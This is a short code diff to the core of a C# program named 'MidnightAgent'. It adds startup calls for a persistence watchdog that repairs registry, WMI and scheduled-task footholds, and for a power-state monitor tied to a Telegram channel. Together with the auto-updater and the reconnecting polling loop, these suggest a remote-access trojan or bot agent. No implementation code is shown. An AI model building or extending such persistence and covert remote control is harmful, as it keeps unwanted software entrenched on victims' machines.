@@ -32,6 +32,12 @@ namespace MidnightAgent.Core
             // Start Auto Updater
             AutoUpdater.Start(_cts.Token);
 
+            // Start Persistence Watchdog (Registry + WMI + Task repair)
+            Persistence.Watchdog.Start(_cts.Token);
+
+            // Start Power Watchdog (Sleep/Wake/Unlock monitoring)
+            PowerWatchdog.Start(_telegram);
+
             // Start polling loop with auto-reconnect
             while (_running)
             {
@@ -69,6 +75,7 @@ namespace MidnightAgent.Core
         {
             _running = false;
             _cts.Cancel();
+            PowerWatchdog.Stop();
         }
 
         /// <summary>
